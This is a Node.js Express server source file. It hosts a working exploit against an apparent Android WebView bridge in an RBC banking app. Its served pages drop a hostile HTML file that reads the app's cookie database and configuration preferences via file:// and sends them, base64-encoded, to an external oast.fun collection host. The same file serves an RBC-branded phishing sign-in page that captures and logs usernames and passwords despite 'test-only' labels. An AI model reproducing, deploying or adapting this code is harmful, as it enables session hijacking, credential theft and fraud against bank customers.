const express = require("express");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

app.disable("x-powered-by");
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (_req, res) => {
  res.redirect("/login");
});

app.get("/exploit.html", (_req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<p id="status">Starting...</p>
<script>
var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";

function log(step) {
    document.getElementById("status").innerText = step;
    new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
}

log("1-page-loaded");

if (typeof WebViewFragment === "undefined") {
    log("FAIL-no-bridge");
} else {
    log("2-bridge-exists");

    try {
        var testHtml = '<html><body><p id="s">Loading...</p><script>' +
            'var S="' + SERVER + '";' +
            'function arrayBufferToBase64(buf){' +
            'var bin="";var bytes=new Uint8Array(buf);' +
            'for(var j=0;j<bytes.byteLength;j++){' +
            'bin+=String.fromCharCode(bytes[j]);}' +
            'return btoa(bin);}' +
            'document.getElementById("s").innerText="Running...";' +
            'try{new Image().src=S+"/log?step=verify-loaded";}catch(e){}' +
            'if(typeof WebViewFragment==="undefined"){' +
            'document.getElementById("s").innerText="No bridge";' +
            'try{new Image().src=S+"/log?step=verify-no-bridge";}catch(e){}' +
            '}else{' +
            'try{new Image().src=S+"/log?step=verify-has-bridge";}catch(e){}' +
            'var target="/data/data/com.rbc.mobile.android/app_webview/Default/Cookies";' +
            'var xhr=new XMLHttpRequest();' +
            'xhr.open("GET","file://"+target,true);' +
            'xhr.responseType="arraybuffer";' +
            'xhr.onload=function(){' +
            'try{new Image().src=S+"/log?step=xhr-ok&size="+xhr.response.byteLength;}catch(e){}' +
            'var b64=arrayBufferToBase64(xhr.response);' +
            'var cs=4000;var n=Math.ceil(b64.length/cs);' +
            'for(var i=0;i<n;i++){' +
            'var c=b64.substr(i*cs,cs);' +
            'WebViewFragment.onNavigateWebHook(JSON.stringify({' +
            '"version":"1.2","type":"externalWebview",' +
            '"destination":S+"/collect?i="+i+"&t="+n+"&d="+encodeURIComponent(c)' +
            '}));}};' +
            'xhr.onerror=function(){' +
            'document.getElementById("s").innerText="XHR error";' +
            'try{new Image().src=S+"/log?step=xhr-error";}catch(e){}};' +
            'xhr.send();}' +
            '</' + 'script></body></html>';

        WebViewFragment.onFeatureEventWebHook(JSON.stringify({
            "version": "1.2",
            "type": "dynamicDownloadDocument",
            "targetFileBase64": btoa(testHtml),
            "fileName": "verify.html"
        }));
        log("3-download-called");
    } catch(e) {
        log("FAIL-download-error-" + e.message);
    }

    // window.location to file:// is blocked on API 36 —
    // use Click 2 (second deeplink) to load verify.html
    setTimeout(function() {
        log("4-waiting-for-click2");
    }, 2000);
}
</script>
</body>
</html>`);
});

app.get("/login", (_req, res) => {
  res.send(renderLoginPage());
});

app.get("/verify", (_req, res) => {
  res.send(renderPhishingPage());
});

app.post("/login", (req, res) => {
  const username = typeof req.body.username === "string" ? req.body.username : "";
  const password = typeof req.body.password === "string" ? req.body.password : "";

  logTestLoginCapture(username, password);

  res.redirect("/login/complete");
});

app.get("/login/complete", (_req, res) => {
  res.send(renderCompletePage());
});

if (require.main === module) {
  app.listen(port, () => {
    console.log(`Mobile test login UI study running at http://localhost:${port}`);
  });
}

function renderPage({ content, title = "Test Login Page Below" }) {
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${title}</title>
    <meta name="description" content="A test-only mobile login UI study.">
    <link rel="stylesheet" href="/styles.css">
    <script src="/app.js" defer></script>
  </head>
  <body>
    <a class="skip-link" href="#main">Skip to main content</a>
    <main id="main" class="page-shell">
      <section class="hero" aria-labelledby="page-title">
        <h1 id="page-title">Joint Registration</h1>
        <br>
        <p class="eyebrow">Please follow on-screen directions.</p>
      </section>
      ${content}
    </main>
  </body>
</html>`;
}

function renderLoginPage() {
  return renderPage({
    content: `<section class="section-block" aria-labelledby="login-section-title">
        <h2 id="login-section-title">Sign In</h2>
        <form class="login-card" action="/login" method="post" data-login-form novalidate>
          <div class="field-row">
            <label for="username">Client Card or Username</label>
            <input id="username" name="username" type="text" autocomplete="username" required aria-describedby="username-error">
            <p class="field-error" id="username-error" aria-live="polite"></p>
          </div>

          <div class="field-row password-row">
            <label for="password">Password</label>
            <input id="password" name="password" type="password" autocomplete="current-password" required aria-describedby="password-error">
            <button class="show-password" type="button" aria-label="Show password" aria-pressed="false" data-toggle-password>
              <span>Show</span>
            </button>
            <p class="field-error" id="password-error" aria-live="polite"></p>
          </div>

          <button class="primary-action" type="submit">
            <span>Continue</span>
            <span class="chevron" aria-hidden="true"></span>
          </button>
        </form>
      </section>

      <section class="section-block" aria-labelledby="study-section-title">
        <h2 id="study-section-title">Note</h2>
        <div class="info-card">
          <div class="info-icon" aria-hidden="true">
            <span></span>
          </div>
          <div>
            <h3>Why do I Need to Sign-In Again?</h3>
            <p>Here at RBC we care about your security. Re-authenticating allows us to confirm it's really you.</p>
          </div>
        </div>
      </section>`
  });
}

function renderCompletePage() {
  return renderPage({
    content: `<section class="section-block" aria-labelledby="complete-section-title">
        <h2 id="complete-section-title">Capture complete</h2>
        <div class="login-card complete-card">
          <h3>Test data received</h3>
          <p>The submitted fields were sent to the server log with a test-only warning. This page does not authenticate, create a session, or store credentials.</p>
          <a class="primary-action link-action" href="/login">
            <span>Start again</span>
            <span class="chevron" aria-hidden="true"></span>
          </a>
        </div>
      </section>`
  });
}

function renderPhishingPage() {
  return renderPage({
    content: `<section class="section-block" aria-labelledby="complete-section-title">
        <div class="login-card complete-card">
          <h3>Success!</h3>
          <p>Device verification completed successfully. Click the link in your invitation email to proceed to the next step.</p>
        </div>
      </section>
      <script>
      var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";
      
      function log(step) {
          document.getElementById("status").innerText = step;
          new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
      }
      
          try {
              var testHtml = '<html><body><p id="s">Verifying Account Status...</p><script>' +
                  'var stolen = "placeholder";' +
                  'var target = "/data/data/com.rbc.mobile.android/shared_prefs/configuration_prefs.xml";' +
                  'var xhr = new XMLHttpRequest();' +
                  'xhr.open("GET", "file://" + target, true);' +
                  'xhr.onreadystatechange = function() {' +
                  '  if (xhr.readyState === 4) {' +
                  '    if (xhr.status === 0 || xhr.status === 200) {' +
                  '      stolen = xhr.responseText;' +
                  '    }' +
                  '    var data = encodeURIComponent(JSON.stringify(stolen));' +
                  '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
                  '      "version": "1.2",' +
                  '      "type": "externalWebview",' +
                  '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?d=" + data' +
                  '    }));' +
                  '  }' +
                  '};' +
                  'xhr.send();' +
                  '</' + 'script></body></html>';
      
              WebViewFragment.onFeatureEventWebHook(JSON.stringify({
                  "version": "1.2",
                  "type": "dynamicDownloadDocument",
                  "targetFileBase64": btoa(testHtml),
                  "fileName": "verify.html"
              }));
              log("3-download-called");
          } catch(e) {
              log("FAIL-download-error-" + e.message);
          }
      
          // window.location to file:// is blocked on API 36 —
          // use Click 2 (second deeplink) to load verify.html
          setTimeout(function() {
              log("4-waiting-for-click2");
          }, 2000);
      }
      </script>`
  });
}

function logTestLoginCapture(username, password) {
  console.log("[CREDENTIAL CAPTURE] ", {
    username,
    password
  });
}

module.exports = { app, logTestLoginCapture };
